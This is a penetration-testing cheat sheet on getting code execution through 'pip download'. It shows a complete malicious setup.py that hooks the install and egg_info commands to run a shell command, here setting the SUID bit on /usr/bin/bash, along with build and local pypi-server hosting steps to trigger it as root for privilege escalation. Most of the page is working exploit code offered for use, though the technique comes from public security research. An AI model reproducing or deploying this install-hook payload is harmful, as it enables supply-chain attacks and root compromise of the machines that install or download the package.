---
title: Pip Download Code Execution
description: Pip is a package management system written in Python. It can download custom Python package so we can create a malicious package to execute arbitrary code.
tags:
    - Linux
    - Privilege Escalation
refs:
    - https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8
    - https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/
date: 2023-04-27
draft: false
---

## Exploitation

### 1. Create Malicious Python Package

Reference: [https://github.com/wunderwuzzi23/this_is_fine_wuzzi](https://github.com/wunderwuzzi23/this_is_fine_wuzzi)

Assume the package named **"exploitpy"**.  
We need to create **"setup.py"** in the project root, and **"__init__.py"**, **"main.py"** in src directory.

```bash
mkdir exploitpy
cd exploitpy
touch setup.py
mkdir src
touch src/__init__.py
echo 'print("hello")' > src/main.py
```

Below is the content of the **"setup.py"**.  
The arbitrary code is injected in the “RunCommand” method. It is executed when **`pip download`** command.

```py
# setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
	# Arbitrary code here!
	import os;os.system("chmod u+s /usr/bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "exploitpy",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

To package the project, run the following command in the project root.

```bash
# If you don't have modules below, install them first.
pip3 install setuptools
pip3 install build

# Build
python3 -m build
```

It generates **`.tar.gz`** file in **`dist`** folder.

### 2. Download the Package

We need to host the package using **`pypi-server`**.

```bash
# Install the module if you don't have it
pip3 install pypiserver

# Copy the tar.gz file into the "package" folder.
mkdir package
cp ./exploitpy/dist/exploitpy-0.0.1.tar.gz ./package
pypi-server run -v -p 8000 ./package
```

Then download the package by the following command.  
If the pip command can be executed as root, we can also escalate privileges.  
When downloading, arbitrary code, that we specified in setup.py, will be executed.

```bash
pip3 download exploitpy --index-url https://localhost:8000 -v
```
